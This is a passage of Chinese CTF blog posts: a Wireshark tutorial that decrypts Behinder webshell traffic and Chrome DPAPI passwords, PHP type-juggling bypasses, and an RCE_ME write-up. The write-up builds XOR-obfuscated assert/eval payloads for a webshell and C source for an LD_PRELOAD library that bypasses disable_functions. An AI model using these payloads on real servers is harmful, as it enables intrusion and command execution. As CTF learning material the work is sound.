<p>可以使用3中逻辑运算符对原语进行组合</p>
<ul>
<li>连接运算符 &amp;&amp;</li>
<li>选择运算符 ||</li>
<li>否定运算符 !</li>
</ul>
<p>例：<br> <code>src 192.168.0.10 &amp;&amp; port 80</code><br> 只捕获源地址是192.168.0.10和源端口或目的端口是80的流量</p>
<p><code>ether host 00-1a-a0-52-e2-a0</code><br> 根据MAC地址捕获</p>
<h4 id="常用捕获过滤器表达式样例"><a href="#常用捕获过滤器表达式样例" class="headerlink" title="常用捕获过滤器表达式样例"></a>常用捕获过滤器表达式样例</h4><p> 过滤器                                      说明                        </p>
<p> tcp[13]&amp;32==32                                          设置URG位的TCP数据包<br> tcp[13]&amp;16==16                                          设置ACK位的TCP数据包<br> tcp[13]&amp;8==8                                              设置PSH位的TCP数据包<br>  tcp[13]&amp;4==4                                            设置RST位的TCP数据包<br> tcp[13]&amp;2==2                                              设置SYN位的TCP数据包<br> tcp[13]&amp;1==1                                            设置FIN位的TCP数据包<br> tcp[13]==18                                                 TCP SYN-ACK数据包<br> ether host 00:00:00:00:00:00(你的MAC地址)       流入或流出你MAC地址的流量<br> !ether host 00:00:00:00:00:00(你的MAC地址)     不流入或流出你MAC地址的流量<br> broadcast                                                    仅广播流量<br> icmp                                                           ICMP流量<br> icmp[0:2]==0x0301                               ICMP目标不可达、主机不可达<br> ip                                                                     仅IPv4流量<br> ip6                                                               仅IPv6流量<br> udp                                                         仅UDP流量                   </p>
<h3 id="2-协议域过滤器"><a href="#2-协议域过滤器" class="headerlink" title="2.协议域过滤器"></a>2.协议域过滤器</h3><p>BPF语法还提供了协议域过滤器，可以坚持协议头中的每一字节来过滤<br> 例：<br> <code>icmp[0]==3</code><br> 返回icmp包的第1个字节的整形值比较，只捕获代表目标不可达信息(类型3)的ICMP数据包</p>
<p><code>icmp[0:2]==0x0301</code><br> 捕获所有类型3代码1表示的目标不可达、主机不可达的ICMP数据包</p>
<p><code>tcp[13]&amp;4==4</code><br> 只捕获带有RST标志的TCP数据包(RST标志位在TCP包偏移13字节，00000100)</p>
<h3 id="3-显示过滤器"><a href="#3-显示过滤器" class="headerlink" title="3.显示过滤器"></a>3.显示过滤器</h3><p><a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">显示过滤器参考</a></p>
<p>常用显示过滤器</p>
<p>过滤器                                  说明<br>!tcp.port==3389                 排除RDP流量<br>tcp.flags.syn==1                具有SYN标志位的TCP数据包<br>tcp.flags.rst==1                  具有RST标志位的TCP数据包<br>!arp                                      排除ARP流量<br>http                                所有HTTP流量<br>tcp.port==23 || tcp.port==21  文本管理流量（Telnet或FTP）<br>smtp || pop || imap         文本email流量（SMTP、POP或IMAP） </p>
<h2 id="三、导出对象"><a href="#三、导出对象" class="headerlink" title="三、导出对象"></a>三、导出对象</h2><p>CTF竞赛中最常见的就是HTTP协议了，而且通信主机少容易分析。</p>
<p>利用导出对象可以快速的判断这段流量在干嘛。</p>
<p><img src="/2019/11/wireshark/image-20191103145931434.png" alt="image-20191103145931434"></p>
<p>选择HTTP…</p>
<p><img src="/2019/11/wireshark/image-20191103155828631.png" alt="image-20191103155828631"></p>
<p>很清晰的可以看到http请求。</p>
<p>很明显是个攻击者对服务器发起了sql注入攻击</p>
<p>根据它的HTTP请求，攻击者获得了那些数据我们同样也能得到。</p>
<p>而且传输过程中的所有文件都能截获。</p>
<p><img src="/2019/11/wireshark/image-20191103170050584.png" alt="image-20191103170050584"></p>
<p>通过右下角的SAVA可以完整的保存传输的文件。</p>
<h2 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h2><p>流量分析就是个大杂烩，什么都能加。</p>
<p>比如php语言，http，tcp/ip协议，各种加解密，隐写，sql注入等等</p>
<p>3CTF复赛的一道流量分析题</p>
<p><a href="https://pan.baidu.com/s/1rLlbRyapHrTOWUc3BfVafQ" target="_blank" rel="noopener">ok.pcapng</a> 提取码: 7y3a </p>
<p>先使用 统计-协议分级功能，查看流量包具体的有哪些协议。</p>
<p><img src="/2019/11/wireshark/image-20191107184246441.png" alt="image-20191107184246441"></p>
<p>百分之九十以上是TCP协议。</p>
<p>然后使用 文件-导出对象-HTTP 查看具体的HTTP请求和是否有文件传输</p>
<p><img src="/2019/11/wireshark/image-20191107184812717.png" alt="image-20191107184812717"></p>
<p>从这些HTTP请求中，应该是通过upload.php上传了file_5d81f9f4d22d41.67475082.php</p>
<p>然后一直与file_5d81f9f4d22d41.67475082.php进行交互。</p>
<p>利用 追踪流的功能查看完整的报文</p>
<p><img src="/2019/11/wireshark/image-20191107221151317.png" alt="image-20191107221151317"></p>
<p>选择HTTP流</p>
<p><img src="/2019/11/wireshark/image-20191107221334510.png" alt="image-20191107221334510"></p>
<p>一个标准的冰蝎马</p>
<p>冰蝎马会先从客户端得到一个加密密匙，用于流量加密。</p>
<p><img src="/2019/11/wireshark/image-20191107222451205.png" alt="image-20191107222451205"></p>
<p>我们追踪一下pass=790的流量。这里我们选择追踪TCP流，方便后面查看其他流</p>
<p><img src="/2019/11/wireshark/image-20191107223755881.png" alt="image-20191107223755881"></p>
<p>得到解密密匙  <code>d59042be6e437849</code></p>
<p>解密脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$post=<span class="string">''</span>; <span class="comment"># 放入你要解密的内容</span></span><br><span class="line">$str=openssl_decrypt($post, <span class="string">"AES128"</span>, <span class="string">'d59042be6e437849'</span>);</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$str);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后发现第二个流的最后一个流量</p>
<p><img src="/2019/11/wireshark/image-20191111115823331.png" alt="image-20191111115823331"></p>
<p><img src="/2019/11/wireshark/image-20191111115909128.png" alt="image-20191111115909128"></p>
<p><img src="/2019/11/wireshark/image-20191111120005244.png" alt="image-20191111120005244"></p>
<p><img src="/2019/11/wireshark/image-20191107234940949.png" alt="image-20191107234940949"></p>
<p>得到一个字符串但目前不知道有什么用</p>
<p>应该在流量包中还有我们没有发现的东西</p>
<p>一、可以通过搜索关键字的16进制，二、可以通过查阅完整TCP流。</p>
<p>1.flag的16进制为 <code>666c6167</code></p>
<p><img src="/2019/11/wireshark/image-20191107235545698.png" alt="image-20191107235545698"></p>
<p>第521个包</p>
<p>2.调整流，大致浏览报文。</p>
<p>在第8个流 ，发现了不一样的东西</p>
<p><img src="/2019/11/wireshark/image-20191107235710539.png" alt="image-20191107235710539"></p>
<p>通过导出对象，把这个SQLite文件导出</p>
<p>然后这题主要是解密<code>Chrome</code>浏览器的保存密码的<code>Login Data</code>数据库（就是个SQLIte3数据库），</p>
<p>可以通过离线的方式导出密码。需要使用用户登录密码解密master key file 获得master key。再用master key解密DPAPI blob 。<br> 解这题主要需要明文密码、<code>blob</code>、<code>master key</code>。主要是322，524，654号数据包：</p>
<p>使用DB Browser for SQLite打开SQLite文件</p>
<p><img src="/2019/11/wireshark/image-20191109230229511.png" alt="image-20191109230229511"></p>
<p>导出加密后的blob</p>
<p>在最后一个流中(11)，发现返回的字符串和之前的不一样，</p>
<p>解密POST包</p>
<p><img src="/2019/11/wireshark/image-20191109233659468.png" alt="image-20191109233659468"></p>
<p>得到文件路径</p>
<p>返回的密文就是<code>master key</code></p>
<p><img src="/2019/11/wireshark/image-20191109231824174.png" alt="image-20191109231824174"></p>
<p>复制到文件或者导出对象</p>
<p>最后利用 windows password recovery来解密 </p>
<p>(没有 windows password recovery所以图是盗的<a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">yyqx</a>大佬的)</p>
<p>  选择Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob <img src="/2019/11/wireshark/2019110711452061.png" alt="在这里插入图片描述"> </p>
<p> <img src="/2019/11/wireshark/20191107114526761.png" alt="在这里插入图片描述"> </p>
<p> <img src="/2019/11/wireshark/20191107114541741.png" alt="在这里插入图片描述"> </p>
<p> SID就是之前路径中的S-1-5-21-2127750816-4215895028-2373289296-1001<br> password就是p@ssw0rd<br> 然后解密 </p>
<p> <img src="/2019/11/wireshark/20191107114557647.png" alt="在这里插入图片描述"> </p>
<p> <img src="/2019/11/wireshark/20191107114605559.png" alt="在这里插入图片描述"> </p>
<p><a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://cloud.tencent.com/developer/news/90236" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>php弱类型</title>
    <url>/2019/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h2><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。而弱类型语言，不会检查变量类型，可以随时的转换变量类型。</p><a id="more"></a>
<p>在php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$x=<span class="number">1</span>;</span><br><span class="line">$x=<span class="string">"string"</span>;<span class="comment">//随意转换变量类型</span></span><br></pre></td></tr></table></figure>

<p>但在C语言中任何变量都要先定义变量类型，再进行赋值。</p>
<h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>在编程中类型转换是不可避免的一个事情，比如说网络编程中get方法或者post方法传入一个需要转换成int的值，再比如说变量间进行比较的时候，需要将变量进行转换，鉴于php是自动进行类型转换，所以会引发很多意想不到的问题。</p>
<p>php有两种比较方式,一种是“= =” 一种是“= = =”这两种都可以比较两个数字的大小，但是有很明显的区别。</p>
<p>“= =”：会把两端变量类型转换成相同的，在进行比较。</p>
<p>“= = =”：会先判断两端变量类型是否相同，在进行比较。</p>
<h2 id="类型转换问题"><a href="#类型转换问题" class="headerlink" title="类型转换问题"></a>类型转换问题</h2><p>php中最常见的就是string 转int，或者int转string。</p>
<p>一般有两种方法，一是强制类型转换<code>(string)$x</code>或<code>strval($x)</code>,<code>(int)$x</code>或<code>intval($X)</code>,二是根据运算符自动转换。</p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="number">123</span>;var_dump($a); <span class="comment">//int(123)</span></span><br><span class="line">var_dump($a + <span class="string">"123"</span>); <span class="comment">//int(246)</span></span><br><span class="line">var_dump($a . <span class="string">"123"</span>); <span class="comment">//string(6) "123123"</span></span><br><span class="line">var_dump($a ==<span class="string">"123a1"</span>); <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a == <span class="string">"123e1"</span>); <span class="comment">//bool(false)</span></span><br><span class="line">var_dump($a == <span class="string">"12.3e1"</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>如果是运算符则会自动转换成数值再进行计算，如果是字符串运算符则转换成字符串再计算</p>
<p>如果是“==”，则会把字符串转换成数值，根据官方文档如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
<h2 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h2><p>hash1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//假设flag的值不可见</span></span><br><span class="line">$int =<span class="number">0</span>;  <span class="comment">//为$int赋值 使其满足if的条件</span></span><br><span class="line"><span class="keyword">if</span>($flag !== $int &amp;&amp; md5($flag) == $int) <span class="comment">//注意"！==" 先判断类型</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"correct\n"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"incorrect\n"</span>;</span><br></pre></td></tr></table></figure>

<p>为$int赋何值，才能满足条件？</p>
<p>先看下面几个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag1 = <span class="string">"&#123;You_can't_see_me&#125;"</span>;</span><br><span class="line">$flag2 = <span class="string">"&#123;You_can't_see&#125;"</span>;</span><br><span class="line">$flag3 = <span class="string">"&#123;You_can't_se&#125;"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(md5($flag1));  <span class="comment">//string(32) "dc39eb7c561e8753d2ce41cb2e1f798b"</span></span><br><span class="line">var_dump(intval(md5($flag1)));  <span class="comment">//int(0)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag2));  <span class="comment">//string(32) "2e2e029620ec42eb68bc24e88d35b027"</span></span><br><span class="line">var_dump(intval(md5($flag2)));  <span class="comment">//int(200)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag3));  <span class="comment">//string(32) "58a39a758897868896d56904481fb4a0"</span></span><br><span class="line">var_dump(intval(md5($flag3)));  <span class="comment">//int(58)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">"1e1q"</span> == <span class="number">10</span>);  <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">"1eq"</span> == <span class="number">1</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>不难看出，不论$flag的值是什么，md5函数都会返回32位的16进制数，利用转换漏洞，可以轻松爆破，从而绕过。但如果e后面有比较长的纯数字字符那么就别想着爆破了(概率较小)。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//假设flag的值不可见</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line">$j=intval(md5($flag));</span><br><span class="line"><span class="keyword">while</span>($i!=$j)</span><br><span class="line">&#123;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $i; <span class="comment">//721</span></span><br></pre></td></tr></table></figure>

<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><p> JSON 是一种轻量级的数据格式，他基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此JSON 定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"abc"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 输入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型进行绕过，我们不知道key值是什么，但是我们知道一件事就是它肯定是字符串，这样就可以了，上文讲过，两个等号时会转化成同一类型再进行比较，直接构造一个数值就可以相等了。最终payload message={“key”:0}。 如果$key中的字符串开头并不是字母，则需要我们去爆破。</p>
<p><a href="https://www.cnblogs.com/anbus/p/10000571.html" target="_blank" rel="noopener">参考文章</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2019/10/bypass-disable-functions/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="绕过-amp-获取shell"><a href="#绕过-amp-获取shell" class="headerlink" title="绕过&amp;获取shell"></a>绕过&amp;获取shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>根据代码要求：</p><ol>
<li><p>长度不能大于40</p>
</li>
<li><p>不能包含大小写字母，数字</p>
</li>
</ol><p>在PHP中两个字符异或可以得到另外一个字符，例如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"!"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030150348065.png" alt="image-20191030150348065"></p><p>利用这点我们就能绕过对字母数字的过滤</p><p>之后我们要绕过对长度的限制，40字符实在是限制太大了</p><a id="more"></a>








<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); //构造payload执行php函数</span></span><br><span class="line">$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line">var_dump($_);      <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">var_dump(urldecode(<span class="string">"%fe%fe%fe%fe"</span>)^urldecode(<span class="string">"%a1%b9%bb%aa"</span>)); <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line"><span class="comment">#$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&amp;_=assert</span></span><br><span class="line"><span class="comment">#&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">//code=assert(eval($_GET[a])&amp;a=phpinfo();)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152007908.png" alt="image-20191030152007908"></p>
<p>接着构造payload让蚁剑来连</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">114.116</span>.<span class="number">44.23</span>:<span class="number">40001</span>/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[<span class="number">_</span>]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_<span class="number">_</span>]);&amp;<span class="number">_</span>=assert&amp;_<span class="number">_</span>=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152338199.png" alt="image-20191030152338199"></p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152446769.png" alt="image-20191030152446769"></p>
<p>flag只有root权限才能访问，readflag估计是用来读flag的。</p>
<p>直接在虚拟终端中执行readflag命令</p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p>
<p>发现命令都无法执行，查看phpinfo()；估计是调用系统命令的函数被禁用了</p>
<p> <img src="/2019/10/bypass-disable-functions/1571499768310.png" alt="1571499768310"> </p>
<h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions  限制执行操作系统命令的方式为：</p>
<ul>
<li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li>
<li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；( LD_PRELOAD是Unix中的一个环境变量，用于定义在程序运行前优先加载的动态链接库，LD和动态库有关，PRELOAD表示预加载，结合起来就是预先加载的动态库。通过这个环境变量，可以覆盖正常的函数库中的函数。)</li>
<li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步  LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名  getuid() 所劫持；</li>
<li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li>
</ul>
<h4 id="a-c文件："><a href="#a-c文件：" class="headerlink" title="a.c文件："></a>a.c文件：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> passwd[]=<span class="string">"123456"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input password!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(passwd,argv[<span class="number">1</span>]))&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);		  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030171503480.png" alt="image-20191030171503480"></p>
<p> 如果是不知道密码的情况下，就可以编写一个动态函数库来覆盖掉strcmp函数恒返回0以达到任意密码都返回Correct </p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(<span class="built_in">Position</span>-<span class="literal">Independent</span> Code)， 则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的</span><br></pre></td></tr></table></figure>

<p>evil.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">"evil function\n"</span>);</span><br><span class="line">true<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030172344903.png" alt="image-20191030172344903"></p>
<p>所以绕过disable_functions,可以通过上传恶意so文件，劫持getuid(),达到命令执行目的。之所以劫持 getuid()，是因为 sendmail  程序会调用该函数（当然也可以为其他被调用的系统函数）</p>
<p>但是这种劫持函数的做法有很大的缺陷：</p>
<p>​    一是，某些环境中，web 禁止启用  senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改  php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进  hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入  hosts（如，127.0.0.1    lamp、lamp.、lamp.com） </p>
<h4 id="C-语言扩展修饰符"><a href="#C-语言扩展修饰符" class="headerlink" title="C 语言扩展修饰符"></a>C 语言扩展修饰符</h4><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了 </p>
<p> GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。 </p>
<p> 此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code> </p>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHP中putenv()函数用于设置服务器环境变量，仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">putenv</span> ( <span class="keyword">string</span> $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>如</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="劫持共享库绕过disable-functions"><a href="#劫持共享库绕过disable-functions" class="headerlink" title="劫持共享库绕过disable_functions"></a>劫持共享库绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
<p> <img src="/2019/10/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p>
<p>bypass.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//获取环境变量</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//获取EVIL_CMDLINE的值</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL。</span></span><br><span class="line">    <span class="comment">//从而使下面的system()正常执行。</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行命令</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>

<p>bypass.php:</p>
